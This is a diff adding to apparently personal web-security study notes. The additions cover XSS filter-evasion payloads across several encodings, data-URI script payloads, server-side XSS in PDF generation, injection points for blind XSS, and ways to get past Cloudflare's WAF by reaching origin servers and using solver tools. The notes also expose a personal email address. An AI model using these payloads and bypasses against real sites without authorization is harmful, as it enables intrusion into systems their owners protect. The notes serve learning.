@@ -9,6 +9,7 @@ XSS types
 
 
 When you are seaching somewhere and if its burp then the search text added in dom by js, will not be shown
+- If website is behind Cloudflare WAF then the vulnerabilities are minimised.
 
 
 ### Reflected or Stored XSS 
@@ -23,8 +24,53 @@ When you are seaching somewhere and if its burp then the search text added in do
 - `<script>` are prioritised to break out of string under js context
 - If space is blocked in js then we can use `/**/` which is basically comment
 - Check for what are all things that are escaped and what are not excaped
-  - `'"</\->` or `/["'\\`]/g, '\\$&()=<>`
-- HTML entity Decode and encode
+  - `'"</\->` or `/["'\\`]/g, '\\$&()=<script>`
+    - </script/x> sometimes breaks the filter
+    - make `<<h2>>` strip extra `<` leaving `<h2>`
+    - case-sensitive tags like <IFRAME> etc
+    - if notreal tag does not get filtered then '<notreal onpointerrawupdate=alert`0`>' does gets exectured
+    - decode html encoding and url encoding
+  - Is 'on[]=' allowed so try onxxx and if allowed then filtering is there
+  - how do they handle unicode, double encoding, unusual encoding
+- Encoding/decoding: Any number of times is good and being bypassed as well. Adding any number of zero;s in hex or decimal encoding will not make any difference
+- Order of encoding (need to figure out): HTML > Unicode
+  - HTML entity Decode and encode
+    - HTML entity encoding lie & -> &amp , < -> &lt; etc `&#60;script&#62;alert(&#39;XSS&#39;)&#60;/script&#62;`
+    - hex endcoding `<img src=x onerror="&#x61;lert(1)">`
+    - decimal encoding: `<a href="javascript&#00000000000058;alert(1)">Click me</a>`
+  - JS encode decode
+    - Unicode-escape: `<script>\u0061lert('XSS')</script>` or  `<script>\u00000000000000000061lert('XSS')</script>`
+    - Hex encoding: `<script>String.fromCharCode(97,108,101,114,116)('Hacked!')</script>`, 
+    - Octal escaping: `eval("\141lert(1)")`
+    - Decimal encoding
+    - base64 encoding: `<script>eval(atob("YWxlcnQoJ0hhY2tlZCEnKTs="))</script>`
+  - CSS encoding: `background: url(javascript:alert('XSS'));`
+    - HEX escape sequence
+    - Unicode escape sequence
+    - URL encoding: `background: url(javascript%3Aalert%28%27XSS%27%29);`
+  - URL encoding
+    - percent encoding e.g. <Space> -> %20, ! -> %21, " -> %22 etc
+    - WAF sometimes does double decoding or tripple before passing query param to server
+  - Json encoding
+    - unicode
+    - backslash escaping
+  - URI obfuscation
+    - `<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="></iframe>`
+  - XML encoding
+    - HTML encoding : ```
+    <stockCheck>
+      <productId>
+        123
+      </productId>
+      <storeId>
+          999 &#x53;ELECT * FROM information_schema.tables
+      </storeId>
+    </stockCheck>
+  - SQL char function
+    - `CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)` == `SELECT` as select might be blacklisted
+    - CHAR() function. This accepts a single decimal or hex code point and returns the matching character. Hex codes must be prefixed with 0x. For example, both CHAR(83) and CHAR(0x53) return the capital letter S
+  ```
+- Look for response header `Content-Type` and `X-Content-Type-Options` as it determines how the response is being intrepreted/parsed by browser
 - Advance concept:
   - `throw onerror=alert,123` : `throw` only returns the last argument and onerror is the handler assigned with alert, and also throw itself triggers onerror function which in turns execute alert(123)
   - `x=x=>{}` is a function with one argument
@@ -38,6 +84,13 @@ When you are seaching somewhere and if its burp then the search text added in do
         You can see that extra argument(any number of arguments) are ignored and can be given expression which is evaluated.
   - Ref: https://portswigger.net/research/xss-without-parentheses-and-semi-colons
   - in `href`, anything after `javascript` is js code
+    - links like `<a href="javascript:alert(1)">`
+    - links can have `javascript` or `data`
+  - link with `data` attribute `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">`
+    - The `data` says the scheme embeds the data directly
+    - `text/html` means how it should be interpreted
+    - `base64` means it is encoded in base64
+    - `PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==` means base64 encoded js code which is `<script>alert(1)</script>`
   - Browser parses  HTML tags and attributes within a response, then it perform HTML-decoding of tag attribute values before they are processed any further.So if thes tag attribute contains js code, it is then decoded and the further processing is done. If the server side blocks or sanitises certain characters, then it can be bypassed using html encoding of those characters.
     - `<a href="#" onclick="... var input='<payload>'; ...">`
     - `&apos;-alert(document.domain)-&apos;` as `'` is encoded as `&apos;`
@@ -52,7 +105,12 @@ When you are seaching somewhere and if its burp then the search text added in do
 
 - Use Iframe to trigger event that requires manual change of environment of browser like window resize and then use js to do the resize
 `<iframe scr="xss-payload" onload=this.style.width='100px'>`
-
+- in printing pdf's server side xss is possible:
+     `<img src="x" onerror="document.write('test')" />` to test if JavaScript is executed during the PDF generation process. then try loading script from another site
+  - xss
+  - file inclusion
+  - ssrf via iframe or other tags
+  - port scan on server
 Reflected cross site attack:
 - Check for input box, params which gets reflected in page and `<link>` in head
     * `<script>alert(1)</script>`
@@ -190,6 +248,36 @@ Dom-based XSS
 
 
  
+
+
+## Blind XSS
+Insert XSS payload at 
+  - comment box, 
+  - signup forms, 
+  - contact forms, 
+  - feedback form, 
+  - referrer, 
+  - host, 
+  - origin, 
+  - user agent header  in request form and
+  - any parameters (param generally used in reflected XSS)
+  - name change to file uploaded
+Tools
+  - online tool (recommended)
+    - bxss hunter 
+      - login: https://bxsshunter.com/bxss-hunter
+        - mabrin300@gmail.com
+  - bursuite
+  - xsshunter setup locally
+
+Payloads are kind of fixed
+- get payload from blind xss payload
+
+
+
+
+
+
 ## questions
 
 Ex:6
@@ -317,6 +405,34 @@ Access-Control-Allow-credentials: true # allow cookies
 - Ref: https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties
 
 - URL validation bypass cheatsheet: https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet
+- css injection: https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities#badcss
+  
+### Bypass cloudflare WAF
+- If website is behind Cloudflare WAF then the vulnerabilities are minimised.
+- Cloudflare WAF has anti-DDos protection mechanism and many more
+- Identify the IP address of the server and use it to bypass the WAF
+- Use dig to find if something is behind the WAF using dig command and check if cname to cloudflare is there or not
+- Also check if direct IP address is allowed or not as whole WAF can be bypassed
+- Cloudflare WAF has following characterstics:
+  - IP address reputation check: like a score 
+  - HTTP request headers: use browser to find out headers and then add them to your request headers
+  - TLS fingerprinting:
+  - HTTP/2 Fingerprinting
+- Solution to not get blocked
+  - Cloudflare solvers
+    - cloudscraper, flaresolverr
+    - use headless browser to bypass WAF
+  - Calling directly calling the origin server
+    - Mostly DNS record for these server are hidden but can be found by checkking the mailing address, databases, subdomain address that may point to origin server
+    - Shodan, cloudflar, cloudpeler might reveal this
+    - use cURL to specify the host header as the request to origin IP lacks a valid `Host` header and would get blocked
+    - Force the computer to use computer's host file
+  - Fortified headless browser like seleinium or some other webdriver
+  - Smart Proxies to bypass WAF
+    - ZenRows proxy rotator (premium proxy)
+  - Cloudflare waiting room and reverse engineer its challenge
+    - ref : https://www.zenrows.com/blog/bypass-cloudflare#bypass-cloudflare-waiting-room
+
 
 ### IP ADDRESS BYPASS
 - Applications decode URLs incorrectly or don't normalize input before validation.
